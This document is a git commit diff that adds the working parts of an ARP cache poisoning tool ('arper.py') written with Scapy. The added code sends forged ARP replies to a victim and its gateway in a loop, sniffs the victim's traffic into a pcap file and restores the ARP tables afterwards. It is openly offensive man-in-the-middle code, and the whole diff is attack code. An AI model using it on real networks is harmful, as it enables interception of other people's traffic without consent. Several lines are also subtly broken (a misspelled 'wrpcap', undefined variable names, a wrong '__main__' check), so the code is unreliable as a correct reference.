0cda4d155c6b7648f6fab71adf4a49fcc48afe16
Lexnovic <lexnovic@gmail.com>
2024-08-02 19:56:38 +0200

    ARP Cache Poisoner added funcs

--- arper.py
+++ arper.py
@@ -5,24 +5,89 @@ import sys
 import time
 
 def get_mac(target_ip):
-    pass
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
+    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
+    for _, r in resp:
+        return r[Ether].src
 
 
 class Arper:
     def __init__(self, victim, gateway, interface='en0'):
-        pass
+        self.victim = victim
+        self.victimmac = get_mac(victim)
+        self.gateway = gateway
+        self.gatewaymac = get_mac(gateway)
+        self.interface = interface
+        conf.iface = interface
+        conf.verb = 0
+        print(f'Initialized {interface}:')
+        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
+        print(f'Victim ({victim}) is at {self.victimmac}.')
+        print('-'*30)
 
     def run(self):
-        pass
+        self.poison_thread = Process(target=self.poison)
+        self.poison_thread.start()
+
+        self.sniff_thread = Process(target=self.sniff)
+        self.sniff_thread.start()
 
     def poison(self):
-        pass
+        poison_victim = ARP()
+        poison_victim.op = 2
+        poison_victim.psrc = self.gateway
+        poison_victim.pdst = self.victim
+        poison_victim.hwdst = self.victimmac
+        print(f'ip src: {poison_victim.psrc}')
+        print(f'ip dst: {poison_victim.pdst}')
+        print(f'mac dst: {poison_victim.hwdst}')
+        print(f'mac src: {poison_victim.hwsrc}')
+        print(poison_victim.summary())
+        print('-'*30)
+        poison_gateway = ARP()
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway
+        poison_gateway.hwdst = self.gatewaymac
+
+        print(f'ip src: {poison_gateway.psrc}')
+        print(f'ip dst: {poison_gateway.pdst}')
+        print(f'mac dst: {poison_gateway.hwdst}')
+        print(f'mac src: {poison_gateway.hwsrc}')
+        print(poison_gateway.summary())
+        print('-' * 30)
+        while True:
+            sys.stdout.write('.')
+            sys.stdout.flush()
+            try:
+                send(poison_victim)
+                send(poison_gateway)
+            except KeyboardInterrupt:
+                self.restore()
+                sys.exit()
+            else:
+                time.sleep(2)
 
     def sniff(self, count=200):
-        pass
+        time.sleep(5)
+        print(f'Sniffing {count} packets')
+        bpf_filter = "ip host %s" % victim
+        packet = sniff(count=count, filter=bpf_filter, iface=self.interface)
+        wprcap('arper.pcap', packets)
+        print('Got the packets')
+        self.restore()
+        self.poison_thread.terminate()
+        print('Finished.')
 
     def restore(self):
-        pass
+        print('Restoring ARP tables...')
+        send(ARP(
+            op=2,
+            psrc=self.gateway,
+            hwsrc=self.gatewaymac,
+            pdst=self.victim,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5)
 
 
 if __name__ == 'main':
